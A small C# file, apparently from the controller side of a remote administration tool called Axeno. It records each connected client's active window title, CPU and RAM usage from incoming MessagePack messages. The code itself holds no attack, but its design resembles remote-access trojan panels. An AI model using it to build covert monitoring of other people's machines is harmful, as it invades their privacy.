using Axeno.MessagePack;
using Axeno.Networking.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Networking.Communication
{
    internal class HandleUpdateInfo
    {
        public void Update(Client cli, MsgPack msgpack)
        {
            string activewin = msgpack.ForcePathObject("ActiveWin").AsString;
            string cpu = msgpack.ForcePathObject("CPU%").AsString;
            string ram = msgpack.ForcePathObject("RAM%").AsString;
            cli.CurrentClient.activewin = activewin;
            cli.CurrentClient.cpuUsage= cpu;
            cli.CurrentClient.ramUsage = ram;
        }
    }
}
